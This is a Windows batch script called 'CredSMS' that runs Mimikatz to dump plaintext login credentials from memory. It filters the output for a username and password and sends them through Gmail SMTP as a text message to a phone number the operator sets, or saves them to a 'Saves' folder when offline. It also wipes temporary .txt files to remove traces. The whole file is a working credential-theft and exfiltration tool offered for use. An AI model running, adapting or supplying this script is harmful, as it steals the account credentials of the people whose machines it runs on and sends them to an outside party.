@echo off
@echo off
CLS

Set VER=1.0

:::::::::::::   CHANGE THESE VALUES  :::::::::::::::::
::
:: 			Change These Before Running!
SET From=username@gmail.com
SET Pass=password
::
:: 			   Where to Send the SMS ?
SET To=phonenumber@tmomail.net
::
::
:: 		AT&T = @txt.att.net
:: 		Verizon = @vtext.com
:: 		T-Mobile = @tmomail.net
:: 		Sprint = @messaging.sprintpcs.com
::	 	Straight Talk = @vtext.com
:: 		Cricket = @sms.mycricket.com
:: 		Boost = @myboostmobile.com
::
::		As a side note, E-Mails work as well :)
::
:::::::::::::::::::::::::::::::::::::::::::::::::::::::

:: Getting Ready
IF EXIST %Temp%\*.txt Del /S /F /Q %Temp%\*.txt >nul 2>&1
IF EXIST *.txt DEL *.txt /F /Q >nul 2>&1

:: Parameters
IF "%1"=="/?" (
	Echo.
	Echo    CredSMS %VER%, by SpokedVictor a.k.a Spoked
	Echo.
	Echo /l = Save Locally
	Echo /v = Version Info
	Pause >nul 2>&1
	Exit
)

IF "%1"=="/v" (
	Echo Version: %VER%
	Pause >nul 2>&1
	Exit
)

:: Check Internet
SET USB=
PING www.google.com -n 1 -w 1000 >nul 2>&1
IF "%ERRORLEVEL%"=="1" (
		SET USB=Yes
		IF EXIST Saves\%Username%.txt DEL Saves\%Username%.txt /F /Q >nul 2>&1
		IF NOT EXIST Saves\ MKDIR Saves\ >nul 2>&1
) Else (
		SET USB=No
)

IF "%1"=="/l" (
		SET USB=Yes
		IF EXIST Saves\%Username%.txt DEL Saves\%Username%.txt /F /Q >nul 2>&1
		IF NOT EXIST Saves\ MKDIR Saves\ >nul 2>&1
) Else (
		GOTO :Start
)

:: Start Program
:Start
Color 1A
Title CredSMS v%VER%
Mode con:cols=47 lines=17
CLS
CC 1F
Echo.
Echo   /----------------I   =X=   I--------------\
Echo   I                                         I
CC 1C
Echo                 Credential SMSer
CC 1B
Echo                 By SpokedVictor
CC 13
Echo                   Version %VER%
CC 1F
Echo   I                                         I
Echo   \----------------I   =X=   I--------------/
Echo.
CC 1A

:: Running Program (step0 basically)
Echo  Running Mimikatz
Start /B /W mimikatz.exe "privilege::debug" "sekurlsa::wdigest" Exit > %Temp%\mimikatz.txt
Title CredSMS v%VER%

:: Formatting Output
Echo  Formatting
Type %Temp%\mimikatz.txt | Findstr "Username Password" >> %Temp%\step1.txt
Type %Temp%\step1.txt | Findstr /v "(null) %ComputerName%$ Username" | Head -n1 >> %Temp%\step2.txt

:: Clean Up Spacing && Assign Variable
Echo  Cleaning Up
FOR /F "Tokens=*" %%a in ('type %Temp%\step2.txt') DO SET S=%%a
Echo %S% >> %Temp%\step3.txt

:: Replace Words (Password to %Username%)
Echo  Replacing Words
SET "search=* Password :"
SET "replace=%UserName% //"
SET "textfile=%Temp%\step3.txt"
SET "newfile=%Temp%\LoginDetails.txt"
call repl.bat "%search%" "%replace%" L < "%textfile%" >"%newfile%"

:: Assign LoginDetails.txt to a Variable
FOR /F "Tokens=*" %%a in ('type %Temp%\LoginDetails.txt') DO SET S=%%a

IF NOT EXIST %Temp%\LoginDetails.txt (
	CC 1C
	Echo     Credential's Missing!
	CC 1A
	Echo  Exiting. 
	Pause >nul
	Exit
)

:Continue
IF "%USB%"=="Yes" (
	GOTO :Local
	Exit
)

:: Send SMS
:Mail
Echo  Sending..
SET SMTP=smtp.gmail.com
SET Port=587
SET Para=-ehlo -auth-login -starttls -q
SET Subj="CredSMS"
SET Body="%S%"
MailSend %Para% -smtp %SMTP% -port %Port% -f %From% -t %To% -sub %Subj% -user %From% -pass %Pass% -M %Body%
GOTO :Done

:: Save Locally
:Local
Echo  Saving..
Echo %S% >> Saves\%Username%.txt

:: Cleaning Up
:Done
Echo  Done!
IF EXIST %Temp%\*.txt ( 
	Del /S /F /Q %Temp%\*.txt >nul 2>&1
	)
CC 1F 
Echo          Thank you!  (Any Key to Exit)
Pause >nul 2>&1
Exit
